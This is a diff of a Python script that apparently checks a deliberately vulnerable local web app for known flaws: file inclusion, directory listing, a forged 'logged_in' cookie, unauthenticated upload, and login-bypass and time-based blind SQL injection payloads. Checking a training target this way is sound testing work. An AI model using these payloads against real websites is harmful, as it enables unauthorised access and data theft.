@@ -1,7 +1,9 @@
 import requests
+import time
+import random
 from paramiko import SSHClient
 
-WILBUR = "http://localhost:8082"
+WILBUR = "http://localhost:9008"
 
 KNOWN_USERS =     users = [
         {
@@ -40,50 +42,47 @@ def main():
     # Check for info.php
     res = requests.get(WILBUR + "/info.php")
     if res.status_code == 200:
-        print("✅ Leaked info.php")
+        print("✅ info.php")
+    else:
+        print("❌ info.php")
+
 
     # Check if local file inclusion is possible
     res = requests.get(WILBUR + "/blog.php?file=blog.php")
     lfi = ";" in res.text or "$" in res.text
     if lfi:
-        print("✅ Local file inclusion possible")
+        print("✅ Local file inclusion")
+    else:
+        print("❌ Local file inclusion")
+
     
      # Check if remote file inclusion is possible
     res = requests.get(WILBUR + "/blog.php?file=http://cirt.net/rfiinc.txt")
     rfi = "phpinfo" in res.text
     if rfi:
-        print("✅ Remote file inclusion possible")
+        print("✅ Remote file inclusion")
+    else:
+        print("❌ Remote file inclusion")
 
     # Check for directory access
     for url in [WILBUR+"/secretTexts", WILBUR+"/dir"]:
         res = requests.get(url)
         if res.status_code == 200 and "Apache" in res.text:
-            print("✅ Found directory access at "+ url)
+            print("✅ Directory access at "+ url)
+        else:
+            print("❌ Directory access at "+ url)
 
     # Check for login cookie
     session = requests.Session()
     session.cookies.set("logged_in", "any")
-    res = session.get(WILBUR+"/admin.php")
-    if "Select html" in res.text:
-        print("✅ Use 'logged_in' cookie with any value logs in at /admin.php")
+    res = session.get(WILBUR+"/messages.php")
+    if "You need an account" not in res.text:
+        print("✅ 'logged_in' cookie at /messages.php")
+    else:
+        print("❌ 'logged_in' cookie at /messages.php")
 
-    # Check for sql injection
-    sql_user = "' or 1=1;--"
-    sql_pass = "pass"
-    if test_login(sql_user, sql_pass):
-        print("✅ SQL injection in 'login.php' still possible")
-    
-    # Check if one can post files without permissions
-    data = {
-        "submit": "any",
-    }
-    session = requests.Session()
-    session.cookies.set("logged_in", "any")
-    res = session.post(WILBUR + "/admin.php", data=data)
-    if "file was not uploaded" in res.text:
-        print(f"✅ You can upload files without authentication via admin.php")
 
-    # Check if one can post files without permissions
+    # Check if one can post files without permissions via backupblog.php
     data = {
         "submit": "any",
     }
@@ -91,13 +90,47 @@ def main():
     session.cookies.set("logged_in", "any")
     res = session.post(WILBUR + "/backupblog.php", data=data)
     if "file was not uploaded" in res.text:
-        print(f"✅ You can upload files without authentication via backupblog.php")
+        print(f"✅ 'logged_in' cookie at /backupblog.php")
+    else:
+        print(f"❌ 'logged_in' cookie at /backupblog.php")
+    
+    # Check if one can post files without permissions via admin.php
+    data = {
+        "submit": "any",
+    }
+    session = requests.Session()
+    session.cookies.set("logged_in", "any")
+    res = session.post(WILBUR + "/admin.php", data=data)
+    if "file was not uploaded" in res.text:
+        print(f"✅ 'logged_in' cookie at /admin.php")
+        # Check for (blind) sql injection in admin.php
+        data["title"] = "a', 'b'); do sleep(3); -- "
+        session = requests.Session()
+        session.cookies.set("logged_in", "any")
+        start = time.time()
+        res = session.post(WILBUR + "/admin.php", data=data, files={"file":(str(random.random()), b"content")})
+        if time.time()-start > 3:
+            print("✅ SQL injection in 'admin.php'")
+        else:
+            print("❌ SQL injection in 'admin.php'")
+    else:
+        print(f"❌ 'logged_in' cookie at /admin.php")
+    
+    # Check for sql injection in login.php
+    sql_user = "' or 1=1;--"
+    sql_pass = "pass"
+    if test_login(sql_user, sql_pass):
+        print("✅ SQL injection in 'login.php'")
+    else:
+        print("❌ SQL injection in 'login.php'")
 
 
     # Check for user login
     for user in KNOWN_USERS:
             if test_login(user["user"], user["pass"]):
-                print(f"✅ Successful login in via 'login.php' as user {user['user']}")
+                print(f"✅ Login {user['user']}")
+            else:
+                print(f"❌ Login {user['user']}")
 
 
 
